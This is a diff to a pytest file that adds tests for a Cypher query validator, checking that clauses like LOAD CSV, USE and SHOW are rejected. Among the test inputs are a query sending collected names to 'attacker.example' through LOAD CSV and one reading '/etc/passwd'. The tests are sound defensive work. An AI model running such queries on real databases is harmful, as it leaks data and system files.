@@ -32,6 +32,31 @@ class TestRejectWriteCypher:
                 "CALL apoc.export.csv.all('out.csv', {}) YIELD file RETURN file"
             )
 
+
+class TestRejectDataLeavingClauses:
+    """Clauses that read from, or switch to, somewhere else are rejected."""
+
+    @pytest.mark.parametrize(
+        "query",
+        [
+            "MATCH (n:Person) WITH collect(n.name) AS t "
+            "LOAD CSV FROM 'https://attacker.example/?d=' + t[0] AS row RETURN row",
+            "load csv from 'file:///etc/passwd' as row return row",
+            "USE otherdb MATCH (n:Person) RETURN n",
+            "SHOW CONSTRAINTS",
+            "MATCH (n:Person) RETURN n UNION SHOW INDEXES",
+        ],
+    )
+    def test_rejects_load_use_and_show(self, query: str) -> None:
+        """LOAD CSV, USE and SHOW never pass the gate."""
+        with pytest.raises(UnsafeCypherError):
+            reject_write_cypher(query)
+
+    def test_keywords_in_strings_and_comments_pass(self) -> None:
+        """Only real tokens count."""
+        reject_write_cypher("RETURN 'LOAD CSV and USE and SHOW'")
+        reject_write_cypher("MATCH (n:Person) RETURN n // SHOW me")
+
     def test_rejects_call_in_subquery(self) -> None:
         """CALL inside a subquery is rejected."""
         with pytest.raises(UnsafeCypherError, match="CALL"):
@@ -136,6 +161,10 @@ class TestRequirePendingGuard:
             "CALL db.index.vector.queryNodes('idx', 3, $v) YIELD node, score "
             "RETURN node",
             "MATCH (n:Person) WHERE n.note = 'n._pending_job_id IS NULL' RETURN n",
+            "MATCH (n:Person) WHERE NOT n._pending_job_id IS NULL RETURN n",
+            "MATCH (n:Person) WHERE NOT (n._pending_job_id IS NULL) RETURN n",
+            "MATCH (n:Person) RETURN n, n._pending_job_id IS NULL AS visible",
+            "MATCH (n:Person) RETURN n ORDER BY n._pending_job_id IS NULL",
             f"MATCH (n:Person) WHERE {_NODE} OR true RETURN n",
             f"MATCH (n:Person) WHERE true OR {_NODE} RETURN n",
             f"MATCH (n:Person) WHERE n.a = 1 OR n.b = 2 AND {_NODE} RETURN n",
